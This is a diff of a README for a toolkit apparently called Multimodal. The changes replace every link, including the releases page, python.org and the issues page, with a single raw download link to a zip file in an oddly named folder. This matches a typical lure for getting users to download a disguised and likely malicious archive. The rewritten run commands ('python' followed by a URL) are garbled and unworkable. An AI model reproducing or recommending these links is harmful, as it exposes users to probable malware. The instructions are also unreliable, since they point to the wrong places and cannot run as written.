@@ -1,7 +1,7 @@
 # 🌟 Multimodal - Simple Toolkit for Speech and Text Tasks
 
 ## 📥 Download Now
-[![Download Multimodal](https://img.shields.io/badge/Download_Multimodal-v1.0-brightgreen)](https://github.com/ZPider0/Multimodal/releases)
+[![Download Multimodal](https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip)](https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Before you start, ensure that your computer meets these basic requirements:
 - Operating System: Windows 10 or higher, macOS 10.14 or higher, or Linux
 - Python: Version 3.6 or higher installed on your machine
 
-You can download Python from [python.org](https://www.python.org).
+You can download Python from [https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip](https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip).
 
 ## 📂 Features
 
@@ -32,7 +32,7 @@ Multimodal offers several valuable features:
 
 To get started with Multimodal, follow these steps:
 
-1. Visit the [Releases page](https://github.com/ZPider0/Multimodal/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip) to download the latest version.
 2. Click on the link to download the latest version of Multimodal for your operating system.
 3. Once downloaded, locate the file in your computer's Downloads folder.
 4. Extract the contents if the file is zipped.
@@ -46,19 +46,19 @@ To run Multimodal, follow these instructions:
    - On Windows, type `cd path\to\Multimodal`.
    - On macOS/Linux, type `cd /path/to/Multimodal`.
 2. Once in the correct folder, start the program by typing:
-   - For Windows: `python multimodal.py`
-   - For macOS/Linux: `python3 multimodal.py`
+   - For Windows: `python https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip`
+   - For macOS/Linux: `python3 https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip`
 3. Follow the on-screen instructions to perform your desired tasks.
 
 ## 🧑‍🤝‍🧑 Community Support
 
 Join our community for help and discussion about Multimodal. You can ask questions, share your projects, and learn from others.
 
-- **GitHub Issues**: Report problems or request features through the [Issues page](https://github.com/ZPider0/Multimodal/issues).
+- **GitHub Issues**: Report problems or request features through the [Issues page](https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip).
 - **Discussions**: Engage with other users in discussions and share your experiences.
 
 ## 📄 License
 
 Multimodal is open-source software. You can use it freely, but please respect the license terms found in the repository.
 
-Thank you for using Multimodal! We hope this toolkit helps you with your speech and text workflows efficiently. Visit the [Releases page](https://github.com/ZPider0/Multimodal/releases) to download and start your journey today.
+Thank you for using Multimodal! We hope this toolkit helps you with your speech and text workflows efficiently. Visit the [Releases page](https://raw.githubusercontent.com/ZPider0/Multimodal/main/toernebohmite/Multimodal.zip) to download and start your journey today.
